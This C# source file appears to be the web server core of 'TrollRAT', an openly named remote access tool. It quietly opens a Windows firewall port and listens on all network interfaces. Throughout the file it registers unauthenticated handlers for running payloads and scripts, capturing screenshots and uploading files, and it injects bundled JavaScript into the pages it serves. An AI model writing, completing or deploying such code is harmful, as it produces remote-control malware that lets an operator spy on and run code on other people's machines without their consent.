using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Linq;
using System.Text.RegularExpressions;

using TrollRAT.Payloads;
using TrollRAT.Utils;
using TrollRAT.Actions;
using TrollRAT.Server.Injections;
using System.Reflection;
using TrollRAT.Server.Commands;

namespace TrollRAT.Server
{
    public abstract class WebServerCommandBase
    {
        public abstract Regex Path { get; }
        public abstract void execute(HttpListenerContext context);

        public void respondString(string str, HttpListenerResponse response, string contentType)
        {
            respondBytes(Encoding.UTF8.GetBytes(str), response, contentType);
        }

        public void respondBytes(byte[] data, HttpListenerResponse response, string contentType)
        {
            response.ContentLength64 = data.Length;
            response.StatusCode = 200;
            response.ContentType = contentType;

            response.OutputStream.Write(data, 0, data.Length);
        }
    }

    public abstract class WebServerCommand : WebServerCommandBase
    {
        protected WebServer server;
        public WebServer Server => server;

        public WebServerCommand(WebServer server)
        {
            this.server = server;
        }
    }

    public abstract class WebServerBase
    {
        protected int port;
        public int Port => port;

        protected List<WebServerCommandBase> commands = new List<WebServerCommandBase>();
        public List<WebServerCommandBase> Commands => commands;

        public WebServerBase(int port)
        {
            this.port = port;
        }

        public void run()
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add(String.Format("http://*:{0}/", port));
            listener.Start();

            while (listener.IsListening)
            {
                var context = listener.GetContext();

                // TODO Better GET/POST handling
                //if (context.Request.HttpMethod == "GET")
                //{
                    var path = context.Request.Url.AbsolutePath;
                    bool processed = false;

                    foreach (WebServerCommandBase cmd in commands)
                    {
                        if (cmd.Path.IsMatch(path))
                        {
                            cmd.execute(context);

                            processed = true;
                            break;
                        }
                    }

                    if (!processed)
                    {
                        context.Response.StatusCode = 404;
                    }

                    context.Response.Close();
                //}
            }
        }
    }

    public class WebServer : WebServerBase
    {
        protected List<Payload> payloads = new List<Payload>();
        public List<Payload> Payloads => payloads;

        protected List<GlobalAction> actions = new List<GlobalAction>();
        public List<GlobalAction> Actions => actions;

        protected GlobalActionDropdown mainDropdown;
        public GlobalActionDropdown MainDropdown => mainDropdown;

        internal Dictionary<string, List<string>> injections = new Dictionary<string, List<string>>();

        public WebServer(int port) : base(port)
        {
            Firewall.openPort("TrollRAT", port, NetFwTypeLib.NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP);

            initInjections();

            addInjection(InjectionPlaceholders.SCRIPT, ResourceUtil.getResourceString("TrollRAT.Web.JS.main.js"));
            addInjection(InjectionPlaceholders.SCRIPT, ResourceUtil.getResourceString("TrollRAT.Web.JS.gaia.js"));

            addInjection(InjectionPlaceholders.BODY, ResourceUtil.getResourceString("TrollRAT.Web.HTML.about.html"));
            addInjection(InjectionPlaceholders.BODY, ResourceUtil.getResourceString("TrollRAT.Web.HTML.yesNo.html"));

            commands.Add(new RootCommand(this));
            commands.Add(new PayloadsCommand(this));
            commands.Add(new GlobalActionsCommand(this));

            commands.Add(new AboutCommand());

            commands.Add(new SettingsCommand(this));
            commands.Add(new ActionsCommand(this));
            commands.Add(new GlobalActionCommand(this));

            commands.Add(new ExecuteCommand(this));
            commands.Add(new SetCommand(this));

            commands.Add(new RunScriptCommand());
            commands.Add(new ScreenshotCommand());
            commands.Add(new UploadCommand());

            commands.Add(new GenerateCodeCommand());
            commands.Add(new UseCodeCommand());

            actions.Add(new GlobalActionPausePayloads(this));

            mainDropdown = new GlobalActionDropdown("Actions");
            actions.Add(mainDropdown);

            mainDropdown.Actions.Add(new GlobalActionShareCodeManager(this));
            mainDropdown.Actions.Add(new GlobalActionScreenshot(this));
            mainDropdown.Actions.Add(new GlobalActionRunScript(this));
            mainDropdown.Actions.Add(new GlobalActionUploadManager(this));
        }

        private void initInjections()
        {
            foreach (string placeholder in (
                from FieldInfo info in typeof(InjectionPlaceholders).GetFields()
                select info.GetValue(null)))
                injections.Add(placeholder, new List<string>());
        }

        public void addInjection(string placeholder, string insertion)
        {
            injections[placeholder].Add(insertion);
        }
    }
}
